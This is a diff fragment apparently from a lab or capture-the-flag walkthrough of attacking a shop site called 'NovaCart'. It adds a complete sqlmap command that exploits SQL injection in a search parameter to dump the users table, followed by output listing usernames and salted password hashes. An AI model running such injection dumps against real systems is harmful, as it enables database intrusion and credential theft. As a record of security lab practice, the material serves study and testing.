@@ -234,5 +234,19 @@ Database: NovaCart
 Ill select the users table
 
 ```python
+sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5 -D NovaCart -T users --dump
 
+Database: NovaCart
+Table: users
+[4 entries]
++----+------------+-----------------------------------------------------------------------+
+| id | username   | password_hash                                                         |
++----+------------+-----------------------------------------------------------------------+
+| 5  | j.paul     | 65a3657685b09db625ef25da7754d7d140e75c3640dc2482de87218ee8d85b2b:jb44 |
+| 6  | m.ruehl    | 57eeb5788565564c9a3a0283eb615204534583a8fbd3ccae1637a04df12287b1:jb43 |
+| 7  | d.barowski | bf9b834e082c88823b59d05446a819276a907114c928505b829ddbbad73d6d35:jb42 |
+| 8  | d.winkler  | 66be630f32845c0d7b098b4d94f1ca424ae3e35266267078f7974248caf412ac:jb45 |
++----+------------+-----------------------------------------------------------------------+
 ```
+Found some users and some password hashes
+
